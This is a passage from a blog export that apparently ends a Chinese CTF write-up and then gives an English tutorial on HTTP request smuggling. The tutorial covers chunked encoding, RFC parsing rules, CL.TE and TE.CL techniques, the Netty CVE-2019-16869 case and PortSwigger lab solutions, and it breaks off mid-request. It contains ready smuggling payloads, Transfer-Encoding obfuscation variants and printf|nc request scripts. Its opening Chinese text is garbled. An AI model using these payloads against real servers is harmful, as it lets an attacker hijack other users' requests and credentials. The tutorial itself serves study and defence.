çš„æ·±åˆ»æŒ‡ç‚¹ï¼Œä¿®æ”¹äº†ä¸€ä¸‹å»¶è¿Ÿæ—¶é—´ä»¥åŠæœåŠ¡å™¨å“åº”çš„æ–‡ä»¶çš„å¤§å°ï¼ŒæˆåŠŸç‡å¾—åˆ°äº†å¾ˆå¤§çš„æé«˜ï¼ŒåŸºæœ¬æ¯æ¬¡éƒ½å¯ä»¥ getflagã€‚\n \nè„šæœ¬æ”¾åœ¨gist-exp.pyï¼Œå…¶ä¸­ 192.168.34.1 æ˜¯æœ¬åœ°é¢˜ç›®åœ°å€ï¼Œ192.168.151.132 æ˜¯ client çš„åœ°å€ã€‚\nReferences 20191228-hxp36c3ctf\nhttps://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0\nhttps://ctftime.org/task/10211\n","date":"2020-01-08T02:24:13Z","permalink":"https://blog.zeddyu.info/2020/01/08/36c3-web/","title":"36c3 Web å­¦ä¹ è®°å½•"},{"content":"This year\u0026rsquo;s Defcon 27 and Black Hat both mentioned HTTP DESYNC ATTACKS. I wanted to take the time to study it a few months ago, but I haven\u0026rsquo;t had much time. I recently took a look at it.\nSorry for my bad English. If you can read Chinese, I recommend you to read this in Chinese. The Chinese part is here ä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ HTTP Smuggling æ”»å‡».\nWhen I researched the other day, it happened that mengchen@Knownsec 404 Team also published an article, which also brought me more inspiration. The author\u0026rsquo;s article is very good. I strongly recommend reading it. Here I combine the author\u0026rsquo;s article with some of my own understanding. This article can also be understood as a supplement and a more detailed description of that article.\nThe entire article was delayed for about two months because of my time. The middle time interval may be longer, so the article will have more omissions, please forgive me. It is not easy to write. Recently, I have been paying attention to this aspect of security issues. Welcome to study and discuss together: ) Contact: emVkZHl1Lmx1QGdtYWlsLmNvbQ==\nIn the future, if there is a new summary, I will also send my blog.\nTL;NR  \nPic from https://twitter.com/SpiderSec/status/1200413390339887104?s=19\nTimeLine Before we mention HTTP Smuggling, let\u0026rsquo;s take a look at the evolution process:\n@Amit Klein proposed the HTTP Response Splitting technology in 2004, which is the prototype of the HTTP Smuggling attack.\nAbout HTTP Smuggling This attack method was first proposed by @Watchfire in 2005 HTTP Request Smuggling.\nHTTP Parameter Pollution (HPP), also known as HTTP parameter pollution, is actually a special HTTP Smuggling attack. It was first proposed by @Stefano di Paola \u0026amp; @Luca Carettoni at the OWASP Poland conference in 2009. It caused a big sensation and was widely used in bypassing WAF.\nDefcon 24 in 2016, @regilero proposed Hiding Wookiees In Http, Further reveals the HTTP Smuggling attack.\nDefcon 27 in 2019, @James Kettle proposed [HTTP Desync Attacks: Smashing into the Cell Next Door](https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON- 27-albinowax-HTTP-Desync-Attacks.pdf), explained How to use PayPal vulnerability with HTTP Smuggling technology.\nCauses However, @James Kettle\u0026rsquo;s PPT did not describe in detail what the attack was and how it was formed. At first, I still had very big doubts after reading it. Then I learned about the HTTP Smuggling\u0026rsquo;s in the @regilero blog. Article, I have a clear understanding.\nHTTP Connection Mod In the protocol design before HTTP1.0, every time a client makes an HTTP request, it needs to establish a TCP connection with the server. Modern web site pages are composed of multiple resources. We need to obtain the content of a web page, not only request HTML documents, but also various resources such as JS, CSS, and images. , It will cause the load overhead of the HTTP server to increase. So in HTTP1.1, Keep-Alive and Pipeline were added.\nKeep-Alive According to RFC7230:\n â€‹\tHTTP/1.1 defaults to the use of \u0026ldquo;persistent connections\u0026rdquo;, allowing multiple requests and responses to be carried over a single connection. The \u0026ldquo;close\u0026rdquo; connection option is used to signal that a connection will not persist after the current request/response. HTTP implementations SHOULD support persistent connections.\n Keep-Alive is used by default in HTTP/1.1, allowing multiple requests and responses to be hosted on a single connection.\n â€‹\tThe so-called Keep-Alive, is to add a special request header Connection: Keep-Alive in the HTTP request, tell the server, after receiving this HTTP request, do not close the TCP link, followed by the same target server HTTP Request, reuse this TCP link, so only need to perform a TCP handshake process, which can reduce server overhead, save resources, and speed up access. Of course, this feature is enabled by default in HTTP1.1.\n Of course, some requests carry Connection: close, after the communication is completed, the server will interrupt the TCP connection.\nPipline  With Keep-Alive, there will be a Pipeline, and the client can send its own HTTP request like a pipeline without waiting for the response from the server. After receiving the request, the server needs to follow the first-in first-out mechanism, strictly correlate the request and response, and then send the response to the client.\nNowadays, the browser does not enable Pipeline by default, but the general server provides support for Pipleline.\n The more important introduction in HTTP / 1.1 is the pipeline technology. The following is a comparison chart with and without piepeline technology:\n \nWe can clearly see that after using the pipeline, there is no need to wait for the previous request to complete its response before processing the second request. This is like asynchronous processing.\nMessage Body https://tools.ietf.org/html/rfc7230##section-3.3\nTransfer-Encoding  Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6). However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP\u0026rsquo;s case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.\n Transfer-Encoding is a field designed to support the secure transmission of binary data by 7-bit transfer services. It is somewhat similar to Content-Transfer-Encoding in the MIME (Multipurpose Internet Mail Extensions) header. In the case of HTTP, Transfer-Encoding is mainly used to encode the payload body in a specified encoding form for secure transmission to the user. Introduced in HTTP/1.1 and deprecated in HTTP/2.\nMDN lists several attributes:\nchunked | compress | deflate | gzip | identity Here we mainly focus on chunked, a transmission encoding method, which is not mentioned for the first time in a network attack. It also used in bypassing WAF frequently.\nWe can see the definition specification of chunk transmission in RFC7230.\n 4.1. Chunked Transfer Coding\nThe chunked transfer coding wraps the payload body in order to transfer it as a series of chunks, each with its own size indicator, followed by an OPTIONAL trailer containing header fields. Chunked enables content streams of unknown size to be transferred as a sequence of length-delimited buffers, which enables the sender to retain connection persistence and the recipient to know when it has received the entire message.\n chunked-body = *chunk last-chunk trailer-part CRLF chunk = chunk-size [ chunk-ext ] CRLF chunk-data CRLF chunk-size = 1*HEXDIG last-chunk = 1*(\u0026quot;0\u0026quot;) [ chunk-ext ] CRLF chunk-data = 1*OCTET ; a sequence of chunk-size octets  The chunk-size field is a string of hex digits indicating the size of the chunk-data in octets. The chunked transfer coding is complete when a chunk with a chunk-size of zero is received, possibly followed by a trailer, and finally terminated by an empty line.\nA recipient MUST be able to parse and decode the chunked transfer coding.\n4.1.1. Chunk Extensions\nThe chunked encoding allows each chunk to include zero or more chunk extensions, immediately following the chunk-size, for the sake of supplying per-chunk metadata (such as a signature or hash), mid-message control information, or randomization of message body size.\n chunk-ext = *( \u0026quot;;\u0026quot; chunk-ext-name [ \u0026quot;=\u0026quot; chunk-ext-val ] ) chunk-ext-name = token chunk-ext-val = token / quoted-string  The chunked encoding is specific to each connection and is likely to be removed or recoded by each recipient (including intermediaries) before any higher-level application would have a chance to inspect the extensions. Hence, use of chunk extensions is generally limited\nto specialized HTTP services such as \u0026ldquo;long polling\u0026rdquo; (where client and server can have shared expectations regarding the use of chunk extensions) or for padding within an end-to-end secured connection.\nA recipient MUST ignore unrecognized chunk extensions. A server ought to limit the total length of chunk extensions received in a request to an amount reasonable for the services provided, in the same way that it applies length limitations and timeouts for other parts of a message, and generate an appropriate 4xx (Client Error) response if that amount is exceeded.\n If you don\u0026rsquo;t want to look too carefully here, we just need to understand what kind of structure it is. You can also refer to Wiki: Chunked transfer encoding, for example if we want to send the following message using chunked.\nWikipedia in\\r\\n\\r\\nchunks. We can send it like this:\nPOSTT /xxx HTTP/1.1 Host: xxx Content-Type: text/plain Transfer-Encoding: chunked 4\\r\\n Wiki\\r\\n 5\\r\\n pedia\\r\\n e\\r\\n in\\r\\n\\r\\nchunks.\\r\\n 0\\r\\n \\r\\n Here is a brief explanation. **We use \\r\\n for CRLF, so\\r\\n is two bytes **; the first number 4 indicates that there will be 4 bytes data next, which is the 4 letters of Wiki, and according to the RFC document standard, the letter Wiki part needs to be followed by \\r\\n to indicate the chunk-data part, and the number 4 needs to be followed by \\r\\n to indicate the chunk -size part, and the number is a hexadecimal number, such as the third data.\ne\\r\\n in\\r\\n\\r\\nchunks.\\r\\n Here the first space exists, the \\r\\n in the data counts two characters, and the last \\r\\n indicates the end of the data. In this case, the first space is 1 byte + in 2 bytes letter + 2 \\r\\n counts 4 bytes + \u0026lsquo;chunks.\u0026rsquo; 7 bytes letter = 14 bytes, 14 is \u0026lsquo;e\u0026rsquo; in hexadecimal.\nThe last 0\\r\\n\\r\\n indicates the end of the chunk section.\nBackground In itself, these things are not harmful, they are used to increase the network transmission rate in various ways, but in some special cases, some corresponding security problems will occur.\n â€‹\tIn order to improve the user\u0026rsquo;s browsing speed, improve the user experience, and reduce the burden on the server, many websites use the CDN acceleration service. The simplest acceleration service is to add a reverse proxy server with caching function in front of the source station. When the user requests some static resources, it can be obtained directly from the proxy server without having to obtain it from the source server. This has a very typical topology.\n Here is a picture from @mengchen :\n \nGenerally speaking, the reverse proxy and back-end server will not use pipeline technology, or even keep-alive. The measures taken by the reverse proxy is to reuse the TCP connection, because compare with the reverse proxy and back-end server, the reverse proxy server and the back-end server IP are relatively fixed, and requests from different users establish a link with the back-end server through the proxy server, and the TCP link between the two is reused.\n \n \n \n â€‹\tWhen we send a fuzzy HTTP request to the proxy server, because the implementation of the two servers is different, the proxy server may consider this to be a HTTP request and then forward it to the source server of the back-end. However, after the source server is parsed, only part of it is a normal request, and the remaining part is a smuggling request. When the part affects the normal user\u0026rsquo;s request, the HTTP smuggling attack is implemented.\n The HTTP Smuggling attack is based on the inconsistency between the reverse proxy and the backend server in parsing and processing HTTP requests. Using this difference, we can embed another HTTP request in order to achieve our purpose of â€œsmugglingâ€ the request. It directly shows that we can access intranet services or cause some other attacks.\nAttack Method Since it is based on analytical differences, what analytical differences will we have? The scenario is the scenario above, but we simplify it and fix the back-end server to one, there is no certain probability. In other words, the architecture is similar to the following diagram:\n User Front Backend | | | |------A-------\u0026gt;| | | |-------A------\u0026gt;| | |\u0026lt;-A(200)-------| |\u0026lt;-A(200)-------| | We know that both Content-Length and Transfer-Encoding can be used as a way to process the body during POST data transmission. In order to facilitate reading and writing, we have the following shorthand rules for field processing priority rules:\n CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.  And Front represents a typical front-end server such as a reverse proxy, and Backend represents a back-end business server that processes requests. In the following, \\r\\n is used instead of CRLF, and the length is two bytes.\nChunks Priority On Content-Length Some may see that this will have the same confusion as me. Is the RFC document not standardized for CL \u0026amp; TE parsing priorities? Yes, we can read RFC 7230 Message Body Length:\n â€‹\tIf a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.\n Although it is pointed out that TL takes precedence over CL, we can still bypass it in some ways, or that the middleware is not implemented in accordance with this RFC standard specification, which leads to differences.\nFor example, we use the following code to send an HTTP request:\nprintf \u0026#39;GET / HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Content-length:56\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tmp HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tests HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ | nc -q3 127.0.0.1 8080 The above correct resolution should be resolved into three requests:\nGET / HTTP/1.1 Host:localhost Content-length:56 Transfer-Encoding: chunked Dummy:Header 0 GET /tmp HTTP/1.1 Host:localhost Dummy:Header GET /tests HTTP/1.1 Host:localhost Dummy:Header If there is a TE \u0026amp; CL priority problem, it will be parsed into two requests:\nGET / HTTP/1.1[CRLF] Host:localhost[CRLF] Content-length:56[CRLF] Transfer-Encoding: chunked[CRLF] (ignored and removed, hopefully) Dummy:Header[CRLF] [CRLF] 0[CRLF] (start of 56 bytes of body) [CRLF] GET /tmp HTTP/1.1[CRLF] Host:localhost[CRLF] Dummy:Header[CRLF] (end of 56 bytes of body, not parsed) GET /tests HTTP/1.1 Host:localhost Dummy:Header Bad Chunked Transmission According to RFC7230 section 3.3.3 ï¼š\n If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.\n When receiving Transfer-Encoding: chunked, zorg, it should return a 400 error.\nWe have a lot payloads to bypass it. Such as:\nTransfer-Encoding: xchunked Transfer-Encoding : chunked Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked GET / HTTP/1.1 Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked Null In Headers This problem is more likely to occur in some middleware servers written in C language, because \\0 stands for the end of string character in C language. When used in the header, if we use \\0, some middleware may appear abnormal Parsing.\nSuch as:\n## 2 responses instead of 3 (2nd query is wipped out by pound, used as a body) printf \u0026#39;GET / HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Content-\\0dummy: foo\\r\\n\u0026#39;\\ \u0026#39;length: 56\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tmp HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tests HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ | nc -q3 127.0.0.1 8080 When some middleware processes the above request, when it encounters \\0, it will continue to read lines, which will also cause parsing differences.\nCRLF According to RFC7320 section-3.5:\n Although the line terminator for the start-line and header fields is the sequence CRLF, a recipient MAY recognize a single LF as a line terminator and ignore any preceding CR.\n In other words, in addition to CRLF, we can also use LF as EOL, but in the version of Node.js \u0026lt;5.6.0, the handling of CRLF is also more interesting:\n[CR] + ? == [CR][LF]\t//true Suppose we have a Front server that parses CRLF normally, and the backend is a Node.js service with this vulnerability. We can send the following request:\nGET / HTTP/1.1\\r\\n Host:localhost\\r\\n Dummy: Header\\rZTransfer-Encoding: chunked\\r\\n Content-length: 52\\r\\n \\r\\n 0\\r\\n \\r\\n GET /tmp HTTP/1.1\\r\\n Host:localhost\\r\\n Dummy:Header\\r\\n The front server will think that Dummy: Header\\rZTransfer-Encoding: chunked\\r\\n is a header. When use CL header parsing, it will consider this a complete request, and Node.js will consider \\rZ as a Newline, according to the parsing rule that TE takes precedence over CL, it is considered that these are two requests, resulting in parsing differences.\nSize Issue You can also use some coded block lengths to generate parsing differences\nSuch as:\nprintf \u0026#39;GET / HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0000000000000000000000000000042\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tmp/ HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ | nc -q3 127.0.0.1 8080 Some middleware will truncate the chunk length data when parsing the chunk size data. For example, here it is shown as only taking 0000000000000000000000000000042 as 00000000000000000, so it will be considered that these are two requests. The first request\u0026rsquo;s chunk size is 0. The second will request /tmp, which results in HTTP Smuggling.\nHTTP Version This is mainly due to the problem caused by HTTP/0.9. Let\u0026rsquo;s take a look at several examples of HTTP:\nHTTP v1.1\nGET /foo HTTP/1.1\\r\\n Host: example.com\\r\\n HTTP v1.0\nGET /foo HTTP/1.0\\r\\n \\r\\n HTTP v0.9\nGET /foo\\r\\n And HTTP/0.9 request and response packets do not have headers. Such as:\n \nBecause HTTP/0.9 response packets do not have headers, they are particularly interesting to be used in HTTP Smuggling.\n \nThe meaning of this picture is that we use HTTP/0.9 for Smuggle when HTTP Smuggling. This is not the HTTP/0.9 standard format, but because some middleware no longer supports the standard format of directly parsing HTTP/0.9, but it is still possible to parse specified HTTP version. Then the following situations may exist:\n \n \nThe above two figures show a rough attack flow. The 24-33664 bytes in chewy2.jpg have a complete HTTP response message. When Golang is processing HTTP/0.9, since we specified Range: bytes=24-33664, we can specify to obtain 24-33664 bytes of the response message, which is to obtain the HTTP message we stored in the picture, and then return it to Golang. Golang standardizes HTTP/0.9 and then remove headers. So the response looks like a new response.\n \nWhen a normal user requests, if Apache reuses the TCP / IP link, it will return the HTTP message we constructed in the picture as a response packet to the user. This is also a very typical idea of HTTP Response Splitting. For details, please see the video demo HTTP Smuggling Examples 2016\nHas a CL in GET In this scenario, the body is used in the GET request, and the length of the body is indicated by Content-Length.\n GET request is not the only one that get affected. I just use it as an example because it is typical. All HTTP requests that do not carry the request body may be affected by this.\n According to RFC7230 Content-Length:\n For example, a Content-Length header field is normally sent in a POST request even when the value is 0 (indicating an empty payload body). A user agent SHOULD NOT send a Content-Length header field when the request message does not contain a payload body and the method semantics do not anticipate such a body.\n In the newest RFC7231 4.3.1 GET also just mention a sentenceï¼š\n A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request.\n For requests that have a body field and indicate the length of the body with Content-Length, the RFC does not strictly explain how the server should handle it, so most middleware also loosely handles GET requests with a body, but this is also part of the situation Because these middlewares do not have a strict standard basis, parsing differences can also cause HTTP Smuggling attacks.\nHere we give a simple and idealized example. The Front server allows body for GET requests, while the Backend server ignores GET requests with body.\nWhen we send following requestsï¼š\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 41\\r\\n \\r\\n GET /secret HTTP/1.1\\r\\n Host: example.com\\r\\n \\r\\n When the Front server processes this request, it will forward the above request to the Backend server as a complete request, and the Backend service will treat this request as two requests when processing this server.\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 41\\r\\n \\r\\n GET /secret HTTP/1.1\\r\\n Host: example.com\\r\\n \\r\\n In this way, we can successfully perform HTTP Smuggling. From this example, it is not difficult to see that if there is a HTTP Smuggling vulnerability in the scene, then the Content-Length data becomes extra important because it affects us. Whether the attack was successful and whether our HTTP request was successfully embedded in an HTTP request.\nThe calculation method here is similar to the previous.\nGET /secret HTTP/1.1\\r\\n\t--\u0026gt;\t\u0026#34;GET /secret HTTP/1.1\u0026#34; 20 characters in total, plus 22 characters in CRLF Host: example.com\\r\\n\t--\u0026gt;\t\u0026#34;Host: example.com\u0026#34; 17 characters in total, plus 19 characters in CRLF 22 + 19 = 41 Bytes.\nTwo Identical Fields - CL Here we take Content-Length as an example. According to RFC7230 section 3.3.2:\n If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., \u0026ldquo;Content-Length: 42, 42\u0026rdquo;), indicating that duplicate Content-Length header fields have been generated or combined by an upstream message processor, then the recipient MUST either reject the message as invalid or replace the duplicated field-values with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message.\n And in the RFC 7230 section 3.3.3 also mention this:\n If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error. If this is a request message, the server MUST respond with a 400 (Bad Request) status code and then close the connection.\n The RFC also has a relatively clear specification for this situation, but let\u0026rsquo;s assume here a relatively simple example. We send the following request:\nGET /suzann.html HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 0\\r\\n Content-Length: 46\\r\\n \\r\\n GET /walter.html HTTP/1.1\\r\\n Host: example.com\\r\\n \\r\\n Here, we assume that the Front server uses the second Content-Length as the parsing standard, discarding the first Content-Length field or doing nothing to the first or anything else, assuming it only processes the second Content-Length field; we are assuming that the Backend server uses the first Content-Length field as the parsing standard, and ignore the second.\nThis is equivalent to injecting another HTTP request into the HTTP request. If the entire scenario looks like ours, there is an HTTP Smuggling attack.\nFor example, if the server uses the first Content-Length as the parsing standard, two HTTP requests will appear in the parsing. If the second is used as the parsing standard, it will be considered that there is only one HTTP request.\nOptional WhiteSpace RFC7320 describes the header field like this:\n 3.2. Header Fields\nEach header field consists of a case-insensitive field name followed by a colon (\u0026quot;:\u0026quot;), optional leading whitespace, the field value, and optional trailing whitespace.\n header-field = field-name \u0026quot;:\u0026quot; OWS field-value OWS field-name = token field-value = *( field-content / obs-fold ) field-content = field-vchar [ 1*( SP / HTAB ) field-vchar ] field-vchar = VCHAR / obs-text obs-fold = CRLF 1*( SP / HTAB ) ; obsolete line folding ; see Section 3.2.4 The field-name token labels the corresponding field-value as having the semantics defined by that header field. For example, the Date header field is defined in Section 7.1.1.2 of [RFC7231] as containing the origination timestamp for the message in which it appears.\n In particular, the first sentence indicates that the field should be immediately followed by : colon, then OWS (Optional WhiteSpace) optional space, then field value, and finally OWS optional space.\nWhat\u0026rsquo;s wrong with this? Obviously, if there is middleware that does not strictly follow the RFC standard for this implementation, HTTP Smuggling attacks will also occur.\nA typical example is CVE-2019-16869. This CVE was discovered by OPPO Meridian Internet Security Lab. It is about HTTP Smuggling vulnerability in Netty middleware.\nPrior to Netty 4.1.42.Final, the processing of Header headers was using [splitHeader](https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/ java / io / netty / handler / codec / http / HttpObjectDecoder.java) method, where the key code is as follows:\nfor (nameEnd = nameStart; nameEnd \u0026lt; length; nameEnd ++) { char ch = sb.charAt(nameEnd); if (ch == \u0026#39;:\u0026#39; || Character.isWhitespace(ch)) { break; } } We don\u0026rsquo;t need to know much about other codes. Here we can know that white space is treated the same as : colon, that is, if there is a space, the field name before : will be processed normally and will not be thrown error or other operations. This is inconsistent with the specifications of the RFC standard, and parsing differences will occur.\n@ Bi3g0 built a clearer schematic of the vulnerability:\n \nThe example used here is to use ELB as the front server and Netty as the backend server. We send the following request:\nPOST /getusers HTTP/1.1 Host: www.backend.com Content-Length: 64 Transfer-Encoding : chunked 0 GET /hacker HTTP/1.1 Host: www.hacker.com hacker: hacker ELB will ignore the Transfer-Encoding field, because there is a space between the colon and the colon. It does not comply with the RFC standard. It will use Content-Length as the parsing standard, so it will consider the above request as a complete request, and then throw it to the Backend server Netty. Netty will parse Transfer-Encoding first. Even if this field does not comply with the RFC standard, but because its implementation is not strict, it will split this request into two because it parses Transfer-Encoding first.\nPOST /getusers HTTP/1.1 Host: www.backend.com Content-Length: 64 Transfer-Encoding : chunked 0 GET /hacker HTTP/1.1 Host: www.hacker.com hacker: hacker This result in HTTP smuggling.\nNetty fixed this vulnerability in 4.1.42 Final: Correctly handle whitespaces in HTTP header names as defined by RFC72 \u0026hellip;\nWhen we send a header request with a space between field name and colon, netty returns 400 correctly.\nCL-TE In the next few attack methods, we can use some Labs provided by @portswigger to practice for us to deepen our understanding. Labs-HTTP request smuggling\nRemember to cancel BurpSuite\u0026rsquo;s automatic update Content-Length function before doing it.\n \nFirst let\u0026rsquo;s look at the situation of CL-TE: Lab: HTTP request smuggling, basic CL.TE vulnerability\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding. The front-end server rejects requests that aren\u0026rsquo;t using the GET or POST method.\nTo solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.\n According to the chall, we only need to let the Backend server receive the GPOST method, and the scenario clearly tells us that it is a CL-TE scenario.\nPOST / HTTP/1.1 Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G We can send above requests twice.\n \n \nWe can make the second method to construct the HTTP method of GPOST. For details, we can follow this flowchart to see:\n User Front Backend | | | |--A(1A+1/2B)--\u0026gt;| | | |--A(1A+1/2B)--\u0026gt;| | |\u0026lt;-A(200)-------| | | [1/2B] |\u0026lt;-A(200)-------| [1/2B] |--C-----------\u0026gt;| [1/2B] | |--C-----------\u0026gt;| * ending B * | |\u0026lt;--B(200)------| |\u0026lt;--B(200)------| |  1A + 1/2B means request A + an incomplete query B A(X) : means X query is hidden in body of query A ending B: the 1st line of query C ends the incomplete header of query B. all others headers are added to the query. C disappears and mix C HTTP credentials with all previous B headers (cookie/bearer token/Host, etc.)  The whole process is that when we send the above request and the Front server preferentially processes with CL, it will think the following data which is 6 bytes is the body of request A.\n0\\r\\n \\r\\n G This request A will be forwarded to the backend as a complete request, and when the backend server preferentially processes it with TE, it will consider follwing data is a complete request.\nPOST / HTTP/1.1 Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 But the alone letter \u0026lsquo;G\u0026rsquo;, it will be considered as an incomplete request. So a 1/2 B request will be generated, so it will wait for the arrival of other data at the Backend server buffer to make the 1/2 B spliced into a complete request. When we send the second request, POST will be concatenated behind G, so the HTTP Method will become the GPOST method, which is the echo that we see, the unrecognized HTTP Method GPOST.\nTE-CL Next we look at the situation of TE-CL. Similarly, we use LAB experiments to deepen our understanding.ï¼šLab: HTTP request smuggling, basic TE.CL vulnerability\n This lab involves a front-end and back-end server, and the back-end server doesn\u0026rsquo;t support chunked encoding. The front-end server rejects requests that aren\u0026rsquo;t using the GET or POST method.\nTo solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.\n According to the chall, what we want to achieve is still to let the backend receive the GPOST request, and the scenario clearly tells us that it is a TE-CL scenario.\nPOST / HTTP/1.1 Host: acde1ffc1f047f9f8007186200ff00fe.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 12 GPOST / HTTP/1.1 0 It should be noted here that at the end you need to add two CRLFs to construct chunk data.\n0\\r\\n \\r\\n Here we can send more than two HTTP request packets, and we can receive the response as shown below.\n \nThe process flow is similar to CL-TE. When the Front server processes this request, it will be processed first according to TE. It will consider the above request as a whole and then forward it to the Backend server. When the Backend server processes it according to CL, it will consider that  12\\r\\n is the body of the first request, the following is the second request, so it will respond to GPOST as an unrecognized HTTP Method.\nTwo Identical Fields - TE Here we look at the situation where TE exists. Similarly, we use LAB experiments to deepen our understanding:Lab: HTTP request smuggling, obfuscating the TE header\n This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren\u0026rsquo;t using the GET or POST method.\nTo solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.\n According to the chall, what we want to achieve is still to let the backend receive the GPOST request, and the scenario clearly tells us that it is a TE-TE scenario. In fact, this scenario can also be considered as the processing of the same field. For example, when processing two TE fields, if the second TE field is taken as the parsing standard, and the second field value is abnormal or the parsing error, it may be ignored. TE field, and CL field for parsing. For example, in this LAB, we send the following request twice.\nPOST / HTTP/1.1 Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ Cache-Control: max-age=0 Content-length: 4 Transfer-Encoding: chunked Transfer-encoding: nothing 12 GPOST / HTTP/1.1 0 Here is the same as the previous scenario, you need to add two CRLF at the end.\n0\\r\\n \\r\\n We can get the response as shown below.\n \nWe can see that two TE fields are used here, and the value of the second TE field is non-standard. Here, Front chooses to process the first TE first. The entire request is a normal request and will be forwarded to the Backend server. The backend server prioritizes the second TE. If the second TE value is abnormal, the CL field will be used for processing. This request will be split into two requests due to the CL field value 4.\nThe first request:\nPOST / HTTP/1.1 Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ Cache-Control: max-age=0 Content-length: 4 Transfer-Encoding: chunked Transfer-encoding: 